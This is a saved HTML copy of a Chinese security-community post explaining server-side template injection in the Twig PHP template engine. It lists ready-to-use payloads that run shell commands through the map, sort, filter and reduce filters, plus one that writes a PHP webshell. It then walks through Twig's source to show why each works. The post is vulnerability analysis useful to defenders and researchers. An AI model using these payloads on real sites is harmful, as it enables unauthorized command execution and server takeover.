@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<!-- saved from url=(0034)https://xz.aliyun.com/t/7518#toc-5 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>TWIG 全版本通用 SSTI payloads - 先知社区</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
+    <link href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/editormd.min.css">
+    <link rel="stylesheet" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/tango.css">
+    <link href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
+    <!-- Le styles -->
+    <link rel="stylesheet" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/OverlayStyle.css">
+    <link rel="stylesheet" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/topic.css">
+    <link rel="stylesheet" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/beautify.css">
+    
+    <link rel="stylesheet" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/editormd.css">
+    <link rel="stylesheet" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/tango.css">
+    <link rel="stylesheet" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/jquery.fancybox.min.css">
+
+    <!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    
+    
+
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/jquery-2.1.3.min.js.下载"></script>
+    
+    
+    <script src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/jquery.fancybox.min.js.下载"></script>
+
+    <!-- <![endif]-->
+<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+</style></head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7518&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
+                    登录</a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1 text-right">
+                    <form method="get" action="https://xz.aliyun.com/search">
+                        <input type="text" placeholder="搜索" name="keyword">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+
+
+    <script src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/jquery.toc.min.js.下载"></script>
+    <script src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/toc.min.js.下载"></script>
+    <script src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/dt.js.下载"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">TWIG 全版本通用 SSTI payloads</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/12098">
+                        <span class="username cell"> yxxx</span></a> <span class="i-seprator"> / </span>
+                    <span> 2020-04-10 09:55:48</span><span class="i-seprator"> / </span>
+                    
+                    <span>浏览数 14084</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="https://xz.aliyun.com/tab/4">社区板块</a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/1">漏洞分析</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(7518);">
+             顶(2)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(7518);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <h1>TWIG 全版本 通用 SSTI payload</h1>
+<p>上次发了一篇Twig 3.x with Symfony的SSTI利用方法，这几天刷twitter的时候又看到了一篇writeup，里面提到了另外一种rce的方法，这种方法不依赖于Symfony。</p>
+<h2 id="toc-0">payloads</h2>
+<p>直接上结论，下面的payload在Twig 3.x 版本测试通过，看了1.x和2.x版本的代码，应该也是可以利用的。</p>
+<ul>
+<li><code>{{["id"]|map("system")|join(",")</code></li>
+<li><code>{{["id", 0]|sort("system")|join(",")}}</code></li>
+<li><code>{{["id"]|filter("system")|join(",")}}</code></li>
+<li><code>{{[0, 0]|reduce("system", "id")|join(",")}}</code></li>
+<li><code>{{{"&lt;?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}</code></li>
+</ul>
+<h2 id="toc-1">分析</h2>
+<h3 id="toc-2">map</h3>
+<p>文档里面map的用法</p>
+<p><a id="img0" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/20200331200906-6b7cf264-7348-1.png"><img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/20200331200906-6b7cf264-7348-1.png"></a></p>
+<p>允许用户传一个arrow function， arrow function最后会变成一个<code>closure</code></p>
+<p>举个例子</p>
+<p><code>{{["man"]|map((arg)=&gt;"hello #{arg}")}}</code></p>
+<p>会被编译成</p>
+<div class="highlight"><pre><span></span><span class="x">twig_array_map([0 =&gt; "id"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))</span>
+</pre></div>
+<p><code>map</code> 对应的函数是<code>twig_array_map</code> ,下面是其实现</p>
+<div class="highlight"><pre><span></span><span class="x">function twig_array_map($array, $arrow)</span>
+<span class="x">{</span>
+<span class="x">    $r = [];</span>
+<span class="x">    foreach ($array as $k =&gt; $v) {</span>
+<span class="x">        $r[$k] = $arrow($v, $k);</span>
+<span class="x">    }</span>
+
+<span class="x">    return $r;</span>
+<span class="x">}</span>
+</pre></div>
+<p>从上面的代码我们可以看到，$arrow 是可控的，可以不传arrow function，可以只传一个字符串。所以我们需要找个两个参数的能够命令执行的危险函数即可。通过查阅常见的命令执行函数：</p>
+<ul>
+<li><blockquote><p>system ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) : string</p>
+</blockquote>
+</li>
+<li><blockquote><p>passthru ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
+</blockquote>
+</li>
+<li><blockquote><p>exec ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] ) : string</p>
+</blockquote>
+</li>
+<li><blockquote><p>popen ( string <code>$command</code> , string <code>$mode</code> )</p>
+</blockquote>
+</li>
+<li><blockquote><p>shell_exec ( string <code>$cmd</code> ) : string</p>
+</blockquote>
+</li>
+</ul>
+<p>只要可以传两个参数的基本都可以，所以前四个都是可以用的。</p>
+<p>思考一下如果上面的都被禁了，还有其他办法吗？</p>
+<ul>
+<li><blockquote><p>file_put_contents ( string <code>$filename</code> , <a href="https://xz.aliyun.com/t/language.pseudo-types.html#language.types.mixed" target="_blank">mixed</a> <code>$data</code> [, int <code>$flags</code> = 0 [, resource <code>$context</code> ]] ) : int</p>
+</blockquote>
+</li>
+</ul>
+<p>通过<code>{{{"&lt;?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}</code> 写个shell 也是可以的。</p>
+<p>当然了应该还有其他函数可以利用。</p>
+<p>下面通过调试来看一下传arrow fucntion 和 直接传字符串会有什么不同。</p>
+<p><code>(arg)=&gt;"hello #{arg}"</code>  会被解析成ArrowFunctionExpression，经过一些列处理会变成一个闭包函数。</p>
+<p><a id="img1" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/20200331200932-7aa4b54c-7348-1.png"><img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/20200331200932-7aa4b54c-7348-1.png"></a></p>
+<p>但是如果我们传的是 <code>`{{["id"]|map("passthru")}}</code> <code>passthru</code> 会被解析成 ConstanExpression</p>
+<p><a id="img2" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/20200331200953-8792a048-7348-1.png"><img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/20200331200953-8792a048-7348-1.png"></a></p>
+<p><code>{{["id"]|map("passthru")}}</code> 最终会被编译成下面这样</p>
+<div class="highlight"><pre><span></span><span class="x">twig_array_map([0 =&gt; "whoami"], "passthru")</span>
+</pre></div>
+<p>按照这个思路，我们去找$arrow 参数的， 可以发现下面几个filter也是可以利用的</p>
+<h3 id="toc-3">sort</h3>
+<div class="highlight"><pre><span></span><span class="x">function twig_sort_filter($array, $arrow = null)</span>
+<span class="x">{</span>
+<span class="x">    if ($array instanceof \Traversable) {</span>
+<span class="x">        $array = iterator_to_array($array);</span>
+<span class="x">    } elseif (!\is_array($array)) {</span>
+<span class="x">        throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));</span>
+<span class="x">    }</span>
+
+<span class="x">    if (null !== $arrow) {</span>
+<span class="x">        uasort($array, $arrow);</span>
+<span class="x">    } else {</span>
+<span class="x">        asort($array);</span>
+<span class="x">    }</span>
+
+<span class="x">    return $array;</span>
+<span class="x">}</span>
+</pre></div>
+<blockquote><p>usort ( array <code>&amp;$array</code> , <a href="https://xz.aliyun.com/t/language.types.callable.html" target="_blank">callable</a> <code>$value_compare_func</code> ) : bool</p>
+</blockquote>
+<p><a id="img3" href="./TWIG 全版本通用 SSTI payloads - 先知社区_files/20200331201021-98391224-7348-1.png"><img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/20200331201021-98391224-7348-1.png"></a></p>
+<p>所以我们可以构造</p>
+
+<pre><code>{{["id", 0]|sort("passthru")}}</code></pre>
+<h3 id="toc-4">filter</h3>
+<div class="highlight"><pre><span></span><span class="x">function twig_array_filter($array, $arrow)</span>
+<span class="x">{</span>
+<span class="x">    if (\is_array($array)) {</span>
+<span class="x">        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);</span>
+<span class="x">    }</span>
+
+<span class="x">    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator</span>
+<span class="x">    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);</span>
+<span class="x">}</span>
+</pre></div>
+<blockquote><p>array_filter ( array <code>$array</code> [, <a href="https://xz.aliyun.com/t/language.types.callable.html" target="_blank">callable</a> <code>$callback</code> [, int <code>$flag</code> = 0 ]] ) : array</p>
+</blockquote>
+<p>只需要传一个参数即可</p>
+
+<pre><code>{{["id"]|filter('system')}}</code></pre>
+<h3 id="toc-5">reduce</h3>
+<div class="highlight"><pre><span></span><span class="x">function twig_array_reduce($array, $arrow, $initial = null)</span>
+<span class="x">{</span>
+<span class="x">    if (!\is_array($array)) {</span>
+<span class="x">        $array = iterator_to_array($array);</span>
+<span class="x">    }</span>
+
+<span class="x">    return array_reduce($array, $arrow, $initial);</span>
+<span class="x">}</span>
+</pre></div>
+<blockquote><p>array_reduce ( array <code>$array</code> , <a href="https://xz.aliyun.com/t/language.types.callable.html" target="_blank">callable</a> <code>$callback</code> [, <a href="https://xz.aliyun.com/t/language.pseudo-types.html#language.types.mixed" target="_blank">mixed</a> <code>$initial</code> = <strong><code>NULL</code></strong> ] ) : <a href="https://xz.aliyun.com/t/language.pseudo-types.html#language.types.mixed" target="_blank">mixed</a></p>
+</blockquote>
+<p>刚开始还是像前面那样构造成了</p>
+
+<pre><code>{{["id", 0]|reduce("passthru")}}</code></pre>
+<p>但是会发现没有执行成功，是因为第一次调用的是<code>passthru($initial, "id")</code>, <code>$initial</code> 是null，所以会失败。所以把<code>$initial</code> 赋值成要执行的命令即可</p>
+
+<pre><code>{{[0, 0]|reduce("passthru", "id")}}</code></pre>
+<p>不知道有没有自动化fuzz，把php允许有callback参数的所有函数找出来，如果有师傅研究过，欢迎来交流。</p>
+<h2 id="toc-6">参考链接</h2>
+<ul>
+<li><a href="https://cyku.tw/volgactf-2020-qualifier/" target="_blank">https://cyku.tw/volgactf-2020-qualifier/</a></li>
+</ul>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="7518">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">4</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="7518">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">2</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/7515" title="一次实战sql注入绕狗"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>一次实战sql注入绕狗</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/7527" title="谈谈Javascript中的变量升级"><span class="related-label" style="">下一篇：</span>谈谈Javascript中的变量升级</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">0 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            <ul>
+                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
+            </ul>
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7518&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7518&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year">
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month">
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/37846_ed0c5102d8f11328a1.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/37846" title="儒道易行">儒道易行</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">54</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64113" title="Ic4_F1ame">Ic4_F1ame</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64530" title="OpenSCA社区">OpenSCA社区</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/61452" title="遇见已经是最大的幸运">遇见已经是最大的幸运</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49027" title="hacker和小黑">hacker和小黑</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">8</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/15858_1a385b86ba5eb88d54.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/15858" title="pic4xiu" style="">pic4xiu</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/54941" title="1794205309262390" style="">1794205309262390</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/49315_e954e2786775c5324a.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49315" title="倩倩大魔王" style="">倩倩大魔王</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49710" title="忘川安全" style="">忘川安全</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/70845" title="1000303887847998" style="">1000303887847998</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">1</span>
+                            </span>
+                        </div>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    <div class="box sfixed" id="toc-container" style="width: 257px;">
+        <div class="panel-info">
+            <div class="panel-heading">
+                <h4>目录</h4>
+            </div>
+            <div id="toc">
+                <div class="high-light" style="display: block; background-color: rgb(243, 243, 243); position: absolute; height: 26px; top: 102px;"></div>
+            <ol style="top: 50px;"><li><a href="https://xz.aliyun.com/t/7518#toc-0">payloads</a></li><li><a href="https://xz.aliyun.com/t/7518#toc-1">分析</a><ol><li><a href="https://xz.aliyun.com/t/7518#toc-2">map</a></li><li><a href="https://xz.aliyun.com/t/7518#toc-3">sort</a></li><li><a href="https://xz.aliyun.com/t/7518#toc-4">filter</a></li><li><a href="https://xz.aliyun.com/t/7518#toc-5">reduce</a></li></ol></li><li><a href="https://xz.aliyun.com/t/7518#toc-6">参考链接</a></li></ol></div>
+        </div>
+    </div>
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart);
+            $("[data-toggle='tooltip']").tooltip();
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer" translate="no">
+    <div class="container text-center">
+        <div class="links">
+            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
+            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
+            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
+            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
+            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
+            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
+        </div>
+    </div>
+</footer>
+
+<script src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/bootstrap.min.js.下载"></script>
+<script src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/xz.js.下载"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7518&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7518&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+            $("[data-toggle='tooltip']").tooltip();
+        });
+    </script>
+
+
+    <script src="./TWIG 全版本通用 SSTI payloads - 先知社区_files/z_stat.php"></script>
+
+
+</body></html>
